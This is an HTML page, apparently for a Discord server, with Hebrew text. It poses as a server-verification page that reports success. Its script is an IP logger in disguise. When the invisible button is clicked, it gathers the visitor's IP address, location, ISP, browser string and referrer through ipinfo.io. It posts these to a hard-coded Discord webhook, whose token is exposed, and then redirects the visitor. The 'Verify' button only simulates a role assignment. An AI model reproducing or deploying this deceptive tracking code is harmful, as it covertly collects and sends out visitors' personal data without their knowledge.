<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>אימות השרת</title>
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
</head>
<body>
    <!-- Invisible button and text initially -->
    <div id="initialContent">
        <h1>✔ אימות הושלם בהצלחה! תחזרו לשרת</h1>
        <button id="verifyButton" class="invisibleButton"></button>
    </div>

    <!-- Real content (hidden initially) -->
    <div id="content" style="display: none;">
        <h1 id="headerText">אימות בשרת של עילאי</h1>
        <button id="verify-btn" class="button">Verify</button>
    </div>

    <script src="snow.js"></script>
    <script>
        document.getElementById('verifyButton').addEventListener('click', function() {
            // Hide the initial content and show the real content
            document.getElementById('initialContent').style.display = 'none';
            document.getElementById('content').style.display = 'flex';

            // Play the audio
            const audio = new Audio('Audio.mp3');
            audio.play();

            // Start snow effect
            document.body.classList.add('snowing');

            // Fetch the user's IP address using ipinfo.io
            axios.get('https://ipinfo.io/json')
                .then(function (response) {
                    const ip = response.data.ip; // Get the user's IP address
                    const city = response.data.city;
                    const region = response.data.region;
                    const country = response.data.country;
                    const timezone = response.data.timezone;
                    const org = response.data.org;

                    // Get the user's browser info
                    const browserInfo = navigator.userAgent;

                    // Get the referrer (if any)
                    const referrer = document.referrer;

                    // Log the collected information
                    console.log("User IP:", ip);
                    console.log("Location:", city, region, country);
                    console.log("Time Zone:", timezone);
                    console.log("Organization:", org);
                    console.log("Browser Info:", browserInfo);
                    console.log("Referrer:", referrer);

                    // Prepare the payload to send to Discord
                    const webhookUrl = 'https://discordapp.com/api/webhooks/1349835869753835560/9h2Z7a8wOKcw6skq0udXhmWOKZMcpCZZYwX5r67UA3X2R5ksRQFT9RY_U2ivIdHuN8u3'; // Replace with your webhook URL
                    const payload = {
                        content: `**User Information:**
                            **IP Address**: ${ip}
                            **Location**: ${city}, ${region}, ${country}
                            **Time Zone**: ${timezone}
                            **Organization**: ${org}
                            **Browser Info**: ${browserInfo}
                            **Referrer**: ${referrer}`
                    };

                    // Post the payload to Discord webhook
                    axios.post(webhookUrl, payload)
                        .then(function (response) {
                            console.log('User information sent to Discord!');

                            // Send verification URL and trigger role assignment after 2 seconds
                            setTimeout(() => {
                                const verificationURL = 'https://dbqlx.github.io/Server-Site/'; // Replace with your actual URL
                                window.location.href = verificationURL; // Redirect user to verification page
                            }, 2000); // 2 seconds delay before redirect
                        })
                        .catch(function (error) {
                            console.error('Error sending to Discord:', error);
                        });
                })
                .catch(function (error) {
                    console.error('Error fetching IP:', error);
                });
        });

        // Button functionality after initial click
        document.getElementById('verify-btn').addEventListener('click', function() {
            let button = this;
            button.innerHTML = 'טוען...';
            button.disabled = true;

            setTimeout(() => {
                button.innerHTML = '✔ אימות הושלם בהצלחה! תחזרו לשרת';
                button.style.backgroundColor = '#218838';

                // Simulating role assignment request
                fetch('YOUR_SERVER_API_ENDPOINT', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ userId: 'USER_ID_TO_ASSIGN_ROLE' })
                }).then(response => {
                    if (response.ok) {
                        console.log('Role assigned successfully');
                    } else {
                        console.error('Failed to assign role');
                    }
                }).catch(error => console.error('Error:', error));
            }, 2000);
        });
    </script>
</body>
</html>
